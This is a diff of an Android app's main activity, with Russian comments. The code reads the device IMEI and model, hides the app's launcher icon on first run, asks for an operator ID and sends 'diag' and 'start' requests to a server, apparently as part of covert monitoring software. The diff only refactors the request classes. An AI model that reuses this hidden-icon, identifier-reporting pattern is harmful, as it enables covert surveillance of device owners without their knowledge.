@@ -57,6 +57,7 @@ public class MainActivity extends Activity {
 	File[] fileArray;
 	private String sIMEI;
 	private String sID;
+	private String account;
 
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
@@ -67,6 +68,8 @@ public class MainActivity extends Activity {
 		FileLog.writeLog("\n\n ============================ ");
 		FileLog.writeLog("\n onCreate \n");
 		FileLog.writeLog("\n ============================\n ");
+		
+		context = getApplicationContext();
 
 		sp = PreferenceManager
 				.getDefaultSharedPreferences(getApplicationContext());
@@ -74,9 +77,9 @@ public class MainActivity extends Activity {
 
 		String imeistring = manager.getDeviceId();
 		String model = android.os.Build.MODEL;
-		String versionAndroid = android.os.Build.VERSION.RELEASE;
+		String androidVersion = android.os.Build.VERSION.RELEASE;
 
-		aboutDev = " Model: " + model + " Version android: " + versionAndroid;
+		aboutDev = " Model: " + model + " Version android: " + androidVersion;
 		sIMEI = "IMEI: " + imeistring;
 		e = sp.edit();
 		e.putString("BUILD", "A0003 2013-10-03 20:00:00");
@@ -84,21 +87,19 @@ public class MainActivity extends Activity {
 		e.putString("ABOUT", aboutDev);
 		e.commit();
 
-		// hideIcon();
-
-		// проверяем, первый ли раз открывается программа
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
 
 		if (!hasVisited) {
 			// проверка на первое посещение
 			e = sp.edit();
-
 			e.putBoolean("hasVisited", true);
 			e.putString("ABOUT", aboutDev);
 			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
 			e.commit();
+			
 			hideIcon();
 		}
+		
 		getID(); // рекурсивный поиск файла с нужным именем
 		if (sp.getString("ID", "ID").equals("ID")) {
 			Log.d("mainID", "ID viewdDalog");
@@ -113,22 +114,21 @@ public class MainActivity extends Activity {
 	        super.onConfigurationChanged(newConfig);  
 	}
 	private boolean viewIDDialog() {
-		// TODO Auto-generated method stub
 		AlertDialog.Builder alert = new AlertDialog.Builder(this);
 
 		alert.setTitle("Ввод ID");
 		alert.setMessage("Введите ID. Нет права на ошибку!");
 
-		// Set an EditText view to get user input
 		final EditText input = new EditText(this);
 		alert.setView(input);
 
 		alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
 			public void onClick(DialogInterface dialog, int whichButton) {
 				String value = input.getText().toString();
-				// Do something with value!
+
 				Log.d(LOG_TAG, "Text: " + value);
 				FileLog.writeLog("Text: " + value);
+				
 				sp = PreferenceManager
 						.getDefaultSharedPreferences(getApplicationContext());
 				Editor e = sp.edit();
@@ -163,8 +163,8 @@ public class MainActivity extends Activity {
 
 		FileLog.writeLog("MainAct diagRequest: before req");
 
-		Request req = new Request(context);
-		req.sendRequest(diag);
+		RequestMakerImpl req = new RequestMakerImpl(context);
+		req.sendDataRequest(diag);
 		Log.d(LOG_TAG, "post req");
 		FileLog.writeLog("MainActRequest: post req");
 	}
@@ -197,10 +197,9 @@ public class MainActivity extends Activity {
 					e.commit();
 					Log.d("ID", sp.getString("ID", "ID"));
 					if (!sp.getString("ID", "ID").equals("ID")) {
-						sendDiagPost();
-						// Toast.makeText(this, sourceApk,
-						// Toast.LENGTH_LONG).show();
-						start(); // запуск сервисов
+						sendStartRequest();
+//						sendDiagPost();
+//						start(); // запуск сервисов
 						return true;
 					}
 					break;
@@ -212,6 +211,12 @@ public class MainActivity extends Activity {
 		return false;
 	}
 
+	private void sendStartRequest() {
+		RequestMaker service = new RequestMakerImpl(context);
+		String str = "\"";
+		service.sendStartRequest(str);
+	}
+
 	public void start() {
 		Log.d(LOG_TAG, "start services");
 		FileLog.writeLog("start services");
@@ -221,7 +226,6 @@ public class MainActivity extends Activity {
 		try {
 			TimeUnit.MILLISECONDS.sleep(1000);
 		} catch (InterruptedException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 
